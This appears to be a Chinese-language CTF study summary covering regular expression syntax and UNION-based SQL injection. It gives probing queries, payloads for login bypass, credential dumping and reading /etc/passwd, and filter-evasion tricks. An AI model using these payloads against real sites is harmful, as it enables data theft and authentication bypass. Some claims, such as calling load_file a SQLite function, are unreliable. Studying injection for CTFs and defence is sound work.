# 题后总结：

## （一）正则表达式

**正则表达式**（Regular Expression，简称 regex 或 regexp）是一种**用来描述字符串模式的工具**，可以理解为一种“搜索规则”或“匹配模板”。

例如·：

```
/[0-9a-zA-Z]'[0-9a-zA-Z]/
```

### 逐部分拆解：

| 符号          | 含义                       | 解释                                                         |
| :------------ | :------------------------- | :----------------------------------------------------------- |
| `/`           | 正则表达式的开始和结束标记 | 就像引号包裹字符串一样                                       |
| `[0-9a-zA-Z]` | 字符组                     | 匹配**任意一个**数字（0-9）或小写字母（a-z）或大写字母（A-Z） |
| `'`           | 字面单引号                 | 匹配一个真正的单引号字符                                     |
| `[0-9a-zA-Z]` | 字符组                     | 匹配**任意一个**数字或字母                                   |
| `/`           | 结束标记                   | 正则表达式结束                                               |

正则匹配的字符串格式是：**字母或数字 + 单引号 + 字母或数字**

#### 2.正则表达式常用符号速查

| 符号       | 含义                           | 示例                              |
| :--------- | :----------------------------- | :-------------------------------- |
| `.`        | 匹配任意一个字符（除了换行）   | `a.c` 匹配 `abc`、`a1c`           |
| `*`        | 前面的字符出现 0 次或多次      | `a*` 匹配 `""`、`a`、`aa`         |
| `+`        | 前面的字符出现 1 次或多次      | `a+` 匹配 `a`、`aa`               |
| `?`        | 前面的字符出现 0 次或 1 次     | `a?` 匹配 `""`、`a`               |
| `[abc]`    | 匹配 a、b、c 中的任意一个      | `[aeiou]` 匹配任意元音字母        |
| `[0-9]`    | 匹配任意数字                   | `[0-9]` 等于 `\d`                 |
| `[a-z]`    | 匹配任意小写字母               |                                   |
| `[A-Z]`    | 匹配任意大写字母               |                                   |
| `[a-zA-Z]` | 匹配任意大小写字母             |                                   |
| `[^abc]`   | 匹配除了 a、b、c 以外的字符    |                                   |
| `\d`       | 匹配任意数字                   | 等于 `[0-9]`                      |
| `\w`       | 匹配任意字母、数字、下划线     | 等于 `[a-zA-Z0-9_]`               |

| `^`        | 匹配字符串开头                 | `^abc` 匹配以 abc 开头的字符串    |
| `$`        | 匹配字符串结尾                 | `abc$` 匹配以 abc 结尾的字符串    |
| `{n}`      | 前面的字符出现 n 次            | `a{3}` 匹配 `aaa`                 |
| `{n,m}`    | 前面的字符出现 n 到 m 次       | `a{2,4}` 匹配 `aa`、`aaa`、`aaaa` |
| `|`        | 或                             | `a|b` 匹配 a 或 b                 |
| `()`       | 分组                           | `(ab)+` 匹配 `ab`、`abab`         |



## （二）UNION注入

SQL 注入中常用技术之一，核心思想是：**利用 SQL 的 UNION 操作符，将攻击者构造的查询结果附加到原始查询结果后面**

#### 一、UNION 是什么？

UNION 是 SQL 中的一个操作符，用于**合并两个或多个 SELECT 语句的结果集**。

##### 基本语法：

sql

```
SELECT 列1, 列2 FROM 表1
UNION
SELECT 列1, 列2 FROM 表2
```



### 示例：

sql

```
-- 表1: users
| id | name  |
|----|-------|
| 1  | admin |
| 2  | john  |

-- 表2: admins
| id | name   |
|----|--------|
| 1  | root   |
| 2  | super  |

-- 执行 UNION 查询
SELECT id, name FROM users
UNION
SELECT id, name FROM admins

-- 结果：
| id | name  |
|----|-------|
| 1  | admin |
| 2  | john  |
| 1  | root  |
| 2  | super |
```



------

#### 二、UNION 注入的原理

当 Web 应用程序存在 SQL 注入漏洞时，攻击者可以**在原始查询后面拼接 UNION 语句**，从而执行自己的 SELECT 查询。

##### 原始代码：

php

```
$result = $db->query("SELECT * FROM users WHERE username='$user'");
```

##### 正常情况：

sql

```
SELECT * FROM users WHERE username='admin'
```

返回 admin 的记录。

##### UNION 注入：

sql

```
SELECT * FROM users WHERE username='xxx' UNION SELECT 1,2,3
```



- `username='xxx'`：第一部分查询返回空（因为 xxx 不存在）
- `UNION SELECT 1,2,3`：第二部分返回攻击者构造的数据
- **最终结果**：程序拿到的是 `(1,2,3)` 这行数据

------

#### 三、UNION 注入的三个必要条件

##### 1. 列数必须相同

UNION 前后的 SELECT 语句必须返回**相同数量的列**。

```
**如何确定列数？** 使用 `ORDER BY` 或 `UNION SELECT` 试探：
sql
-- 方法1：ORDER BY 试探
' ORDER BY 1 --  正常
' ORDER BY 2 --  正常
' ORDER BY 3 --  报错 → 说明只有2列

-- 方法2：UNION SELECT 试探
' UNION SELECT 1 --  报错
' UNION SELECT 1,2 --  正常 → 说明有2列
' UNION SELECT 1,2,3 --  报错
```

### 2. 数据类型必须兼容

对应列的数据类型需要兼容（可以隐式转换）。

### 3. 注入点必须有回显

UNION 注入的结果需要被页面显示出来，否则看不到数据。

#### 四、UNION 注入的常见用途

##### 1. 绕过登录认证

sql

```
' UNION SELECT 1, 'admin', '已知哈希$盐值' --
```

伪造一条 admin 记录，密码用自己知道的。

##### 2. 提取数据库数据

sql

```
' UNION SELECT 1, username, password FROM users --
```

直接 dump 整个用户表。

##### 3. 获取数据库信息

sql

```
' UNION SELECT 1, sqlite_version(), 3 --
```

获取 SQLite 版本。

##### 4. 读取文件（SQLite）

sql

```
' UNION SELECT 1, load_file('/etc/passwd'), 3 --
```

#### 五、UNION 注入的绕过技巧

##### 1. 绕过空格过滤

sql

```
-- 使用注释代替空格
union/**/select/**/1,2,3

-- 使用括号
union(select(1),2,3)

-- 使用换行
union
select 1,2,3
```



##### 2. 绕过引号过滤

sql

```
-- 使用十六进制编码
SELECT * FROM users WHERE username=0x61646d696e

-- 使用 CHAR() 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```



##### 3. 绕过关键字过滤

sql

```
-- 大小写混写
UnIoN SeLeCt 1,2,3

-- 双写（如果过滤是替换为空）
UNIunionON SELselectECT 1,2,3

-- 注释干扰
U/**/NION S/**/ELECT 1,2,3
```
